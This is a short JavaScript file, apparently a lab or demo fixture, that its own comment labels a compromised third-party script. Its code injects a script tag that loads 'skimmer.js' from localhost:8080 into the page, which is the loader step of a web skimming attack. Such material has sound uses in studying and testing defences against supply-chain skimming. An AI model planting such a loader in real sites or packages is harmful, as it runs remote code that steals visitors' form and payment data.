// This represents a compromised third-party JS file

(function() {
  const s = document.createElement('script');
  s.src = 'http://localhost:8080/skimmer.js';  // correct absolute path
  document.head.appendChild(s);
})();
